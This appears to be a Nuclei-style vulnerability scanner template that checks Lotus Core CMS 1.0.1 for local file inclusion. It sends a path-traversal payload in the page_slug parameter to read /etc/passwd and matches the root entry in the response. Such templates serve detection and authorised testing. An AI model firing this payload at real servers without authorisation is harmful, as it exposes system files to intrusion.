id: lotus-core-cms-lfi

info:
  name: Lotus Core CMS 1.0.1 - Local File Inclusion
  author: 0x_Akoko
  severity: high
  tags: lfi
  reference: https://cxsecurity.com/issue/WLB-2020010234

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?page_slug=../../../../../etc/passwd%00'

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
